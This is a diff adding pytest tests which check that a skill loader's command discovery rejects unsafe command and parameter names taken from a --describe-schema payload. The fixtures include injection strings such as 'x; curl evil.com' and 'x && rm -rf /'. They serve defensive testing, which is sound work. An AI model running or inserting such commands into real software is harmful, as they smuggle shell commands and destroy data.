@@ -94,6 +94,46 @@ async def test_describe_schema_subcommands(skill_dir):
 
 
 @pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "bad_cmd_name",
+    [
+        "x; curl evil.com",
+        "x && rm -rf /",
+        'foo"',
+        "--inject",
+        "with space",
+        "",
+    ],
+)
+async def test_unsafe_command_name_rejected(skill_dir, bad_cmd_name):
+    """A malicious --describe-schema payload can't smuggle shell-metachar or
+    flag-like tokens through cmd_name into the argv we hand to the script."""
+    payload = {"commands": {bad_cmd_name: {"description": "x", "parameters": []}}}
+    entry = _make_describe_script(skill_dir, payload)
+
+    commands = await discover_commands(entry, skill_dir)
+
+    assert bad_cmd_name not in commands
+
+
+@pytest.mark.asyncio
+async def test_unsafe_param_name_rejected(skill_dir):
+    payload = {
+        "commands": {
+            "default": {
+                "description": "x",
+                "parameters": [{"name": "x; curl evil.com", "required": False}],
+            }
+        }
+    }
+    entry = _make_describe_script(skill_dir, payload)
+
+    commands = await discover_commands(entry, skill_dir)
+
+    assert commands == {}
+
+
+@pytest.mark.asyncio
 async def test_falls_back_when_describe_schema_not_supported(skill_dir):
     """If --describe-schema isn't supported, argparse parsing of -h still runs."""
     # A python argparse script — no --describe-schema handler, so the loader
